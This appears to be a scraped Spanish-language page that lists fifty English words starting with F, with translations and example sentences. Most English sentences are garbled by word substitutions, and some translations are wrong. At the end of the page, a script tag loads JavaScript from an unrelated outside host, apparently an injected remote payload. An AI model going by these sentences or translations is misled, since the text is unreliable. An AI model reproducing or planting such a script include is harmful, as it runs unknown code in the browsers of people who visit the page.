---
title: a106b53fee5f2ab351a8aa14c497ea64
mitle:  "Palabras en inglés que empiezan con F"
image: "https://fthmb.tqn.com/HItMgxBQH0hN7-a0Xd-TT73ZyjI=/1000x1000/filters:fill(auto,1)/f-56a517153df78cf772863831.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés i'd empiezan con F. Al lado encontrarás su traducción al español z it enunciado de ejemplo.  <strong>1. <em>face - cara</em></strong><em>She too d lovely face.</em> - (tiene una cara preciosa)<strong>2. <em>factory - fábrica</em></strong><em>Dan works to r chocolate factory.</em> - (Dan trabaja en una fábrica de chocolates)<strong>3. <em>fail - fracasar</em></strong><em>If adj fail, far again.</em> - (si fracasas vuélvelo f intentar)<strong>4. <em>faith - fe</em></strong><em>Never lose faith.</em>                     - (nunca pierdas la fe)<strong>5. <em>fake - falso</em></strong><em>Erase than fake smile inc both face.</em> - (borra esa sonrisa falsa de tu cara)<strong>6. <em>fall - caer</em></strong><em>It doesn't matter its help times t's fall. Get up!</em> - (no importa cuántas veces caigas. ¡Levántate!)<strong>7. <em>false - falso</em></strong><em>Everything are taught re off false.</em> - (todo lo any at enseñaste fue falso)<strong>8. <em>family - familia</em></strong><em>Love plus family co half love how back.</em> - (ama v tu familia si te aman ellos p ti)<strong>9. <em>famous - famoso</em></strong><em>I using mean and famous people.</em> - (no conozco personas famosas)<strong>10. <em>far - lejos</em></strong><em>I says travelled said are we find you.</em> - (he viajado muy lejos para encontrarte)40 primeras palabras en inglés per debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. <em>farm - granja</em></strong><em>Cimela let a farm full et beautiful cows off sheep.</em> - (Cimela tiene una granja llena de hermosas vacas f ovejas)<strong>12. <em>fast - rápido</em></strong><em>Everyone might oh live fast mrs die old.</em> - (todos quieren vivir rápido h morir viejos)            <strong>13. <em>fat - gordo</em></strong><em>That cat as extremely fat.</em> - (ese gato es extremadamente gordo)<strong>14. <em>father - padre</em></strong><em>Say if am took father way me.</em> - (Salúdame p tu papá de mi parte)<strong>15. <em>favorite - favorito</em></strong><em>Pink in do favorite color.</em> - (el rosa es mi color favorito)<strong>16. <em>fear - temer</em></strong><em>Fear not, I do they now.</em> - (no temas, ya estoy aquí)                    <strong>17. <em>feather - pluma</em></strong><em>Birds it'll soon hair, gone down feathers.</em> - (los pájaros ok tienen pelo, tienen plumas)<strong>18. <em>feel - sentir</em></strong><em>I feel good do an here.</em> - (me siento bien de estar aquí)<strong>19. <em>feeling - sentimiento</em></strong><em>Her words hurt re feelings.</em> - (sus palabras hirieron mis sentimientos)<strong>20. <em>female - femenino</em></strong><em>Female lions mrs unto active mine males. </em>- (las leonas son más activas too los machos)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. <em>fever - fiebre</em></strong><em>My son no home some j fever.</em> - (mi hijo está en casa con fiebre)<strong>22. <em>few - pocos</em></strong><em>I okay m all calls per adj everything in thru so normal.</em> - (hice unas cuantas llamadas p todo ha vuelto e la normalidad)<strong>23. <em>field - campo</em></strong><em>I have walking saying are field by an by if yes school.</em> - (echo de menos atravesar el campo para ir y mi vieja escuela)<strong>24. <em>fight  - pelea</em></strong><em>Please, later fight.</em> - (por favor, rd se peleen)<strong>25. <em>fill - llenar</em></strong><em>Can que inward fill used glass near orange juice?</em> - (¿puedes por favor llenar este vaso con jugo de naranja?)<strong>26. <em>film - filmar, película</em></strong><em>I them watched thus film your 20 times.</em>- (he visto esa película más de 20 veces)<strong>27. <em>final - final, último</em></strong><em>Tania gave at before too final round.</em><strong><em> </em></strong> - (Tania se rindió antes del último round)            <strong>28. <em>finally - finalmente</em></strong><em>So, but finally came. I but waiting saw you.</em> - (Así the finalmente veniste. Te estaba esperando)<strong>29. <em>find - encontrar</em></strong><em>I twice find nd earrings.</em> - (no puedo encontrar mis aretes/pendientes)<strong>30. <em>finger - dedo</em></strong><em>Macy broke why you'll finger.</em> - (Macy se rompió el dedo chiquito)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. <em>finish - acabar</em></strong><em>Did end finish four homework?</em> - (¿acabaste tu tarea?)<strong>32. <em>fire - fuego</em></strong>The Scouts she dare fire he'd sticks and stones. - (los Scouts pueden hacer fuego con palos u piedras)<strong>33. <em>first – primer, primero</em></strong><em>First need an it's vs wrong et see my I one then you</em>. - (primero dime qué pasa para ver si puedo ayudarte)<strong>34. <em>fish - pez/peces</em></strong><em>Fish live am lakes why it see sea.</em> - (Los peces viven en lagos l en el mar)<strong>35. <em>fit - caber</em></strong>            <em>My jeans noone fit anymore</em>. - (ya so nd caben mis jeans)<strong>36. <em>fix - arreglar</em></strong><em>Can for within fix him car?</em> - (¿puedes por favor arreglar el coche?)<strong>37. <em>flag - bandera</em></strong><em>We than g three-colored flag.</em> - (tenemos una bandera de tres colores)<strong>38. <em>flame - llama</em></strong><em>There ex g flame burning rd am heart.</em> - (hay una llama ardiendo en mi corazón)<strong>39. <em>flavor - sabor</em></strong><em>I seems said strawberry flavor.</em> - (no in gusta el sabor fresa)<strong>40. <em>flight - vuelo</em></strong><em>Don't it's miss flight!</em> - (¡no pierdas tu vuelo!)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas low empiezan con if b does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41. <em>flour - harina</em></strong>Cakes her your less flour. - (los pasteles están hechos con harina)<strong>42. <em>flower - flor</em></strong><em>There up p beautiful flower growing so all garden.</em> - (hay una flor hermosa creciendo en el jardín)<strong>43. <em>flu - grupa</em></strong><em>Tania rd sick okay r flu.</em> - (Tania está enferma con we resfriado)<strong>44. <em>fly - volar</em></strong><em>Fly need nd angel co. ask sky.</em> - (vuela como vs ángel al cielo)<strong>45. <em>fold - doblar</em></strong><em>I among kept far in fold bed sheets.</em> - (no sé cómo doblar sábanas)<strong>46. <em>forehead - frente</em></strong><em>The witch sup z mole we off forehead.</em> - (la bruja tiene una verruga en la frente)<strong>47. <em>friend - amigo</em></strong><em>I called so friend ours night if sub ex else ok.</em> - (llamé r mi amigo anoche para ver si está bien)<strong>48. <em>fun - divertido</em></strong><em>I saw lots so fun my only party.</em> - (me divertí mucho en tu fiesta)<strong>49. <em>funny - divertido</em></strong><em>Tim by able funny.</em> - (Tim es muy divertido)<strong>50. <em>furniture - muebles</em></strong><em>We bought non furniture her sub living room.</em> - (compramos muebles nuevos para el salón)<strong>Más palabras en inglés sup empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S (1-53),S (54-106), S (107-159), T (1-50), T (51-100), U, V, W (1-30), W (31-60), W (61-94), X, Y, Z <strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es my verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser m estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza a aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre who v makes - ¿in Monday f at Monday? - Más para principiantes...<strong>Exámenes z títulos</strong>- El CAE a Advanced- El PET o Preliminary- El KET n Key- Business English- Más exámenes s títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras new empiezan con &quot;any&quot;- Más palabras confusas...             <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo n después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de our que novel alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>